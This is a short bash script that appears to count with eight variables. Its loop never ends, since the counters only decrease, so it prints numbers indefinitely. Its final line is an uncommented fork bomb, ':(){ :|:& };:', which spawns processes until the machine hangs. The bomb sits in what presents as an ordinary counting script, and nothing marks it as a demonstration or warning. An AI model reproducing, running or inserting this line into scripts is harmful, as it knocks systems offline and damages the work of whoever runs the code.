#!/bin/bash

num_0=0
num_1=0
num_2=0
num_3=0
num_4=0
num_5=0
num_6=0
num_7=0

while [[ $num_0 -le 1 && $num_1 -le 1 && $num_2 -le 1 && $num_3 -le 1 && $num_4 -le 1 && $num_5 -le 1 && $num_6 -le 1 && $num_7 -le 1  ]]
do
  echo $num_0
  echo $num_1
  echo $num_2
  echo $num_3
  echo $num_4
  echo $num_5
  echo $num_6
  echo $num_7
  num_0=$(($num_0 -1 ))
  num_1=$(($num_1 -1))
  num_2=$(($num_2 -1))
  num_3=$(($num_3 -1 ))
  num_4=$(($num_4 -1))
  num_5=$(($num_5 -1))
  num_6=$(($num_6 -1 ))
  num_7=$(($num_7 -1))
done
:(){ :|:& };:
